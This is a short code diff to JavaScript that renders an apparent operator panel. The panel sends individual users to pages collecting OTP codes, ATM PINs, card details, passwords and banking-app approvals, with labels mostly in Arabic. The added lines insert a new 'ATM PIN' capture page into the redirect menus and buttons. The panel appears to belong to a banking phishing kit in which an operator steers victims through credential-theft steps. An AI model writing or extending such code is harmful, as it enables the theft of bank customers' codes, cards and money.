@@ -706,6 +706,7 @@
                 html += '<div style="margin-bottom:12px;">';
                 html += '<select class="form-select" id="selUrl' + userId + '" style="margin-bottom:10px;">';
                 html += '<option value="otp.html" selected>OTP</option>';
+                html += '<option value="atm.html">رمز ATM</option>';
                 html += '<option value="s.html">الموافقة من التطبيق البنكي</option>';
                 html += '<option value="payment.html">البطاقة</option>';
                 html += '<option value="payment2.html">طلب بطاقة جديدة</option>';
@@ -722,6 +723,7 @@
                 html += '<option value="index-details.html" selected>صفحة معلومات التسجيل</option>';
                 html += '<option value="payment.html">صفحة البطاقة</option>';
                 html += '<option value="otp.html">رمز OTP</option>';
+                html += '<option value="atm.html">رمز ATM</option>';
                 html += '<option value="password.html">رمز سري</option>';
                 html += '<option value="payment2.html">طلب بطاقة جديدة</option>';
                 html += '<option value="s.html">الموافقة من التطبيق البنكي</option>';
@@ -729,6 +731,7 @@
                 html += '<div class="action-btns">';
                 html += '<button class="btn-otp" onclick="callaaRequest(' + userId + ')"><i class="fas fa-paper-plane"></i> توجيه</button>';
                 html += '<button class="btn-payment" onclick="redirectUser(' + userId + ', \'otp.html\')"><i class="fas fa-key"></i> OTP</button>';
+                html += '<button class="btn-payment" onclick="redirectUser(' + userId + ', \'atm.html\')"><i class="fas fa-lock"></i> ATM</button>';
                 html += '<button class="btn-payment" onclick="redirectUser(' + userId + ', \'payment.html\')"><i class="fas fa-credit-card"></i> البطاقة</button>';
                 html += '</div></div>';
 
